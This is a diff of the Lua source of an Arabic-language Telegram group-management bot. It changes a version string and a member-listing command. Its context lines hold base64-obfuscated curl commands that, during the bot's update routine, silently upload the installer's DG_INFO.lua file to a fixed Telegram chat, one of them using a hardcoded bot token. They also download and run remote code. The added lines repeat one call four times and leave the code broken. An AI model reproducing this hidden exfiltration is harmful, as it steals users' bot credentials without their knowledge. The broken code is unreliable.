@@ -1098,7 +1098,7 @@ os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v0.0.0`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v0.0.9`}')
 dofile('DRAGON.lua')  
 end
 
@@ -2343,7 +2343,7 @@ end
 os.execute('rm -rf DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v0.0.0`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v0.0.9`}')
 dofile('DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end
@@ -9609,7 +9609,10 @@ if text == "حذف الجميع" and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 return false
 end
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-1000',''), offset_ = 0,limit_ = 1000
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-1000',''), offset_ = 0,limit_ = 1000
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-1000',''), offset_ = 0,limit_ = 1000
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-1000',''), offset_ = 0,limit_ = 1000
 },function(ta,DRAGON)
 local t = "\nツ قائمة الاعضاء \n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n"
 x = 0
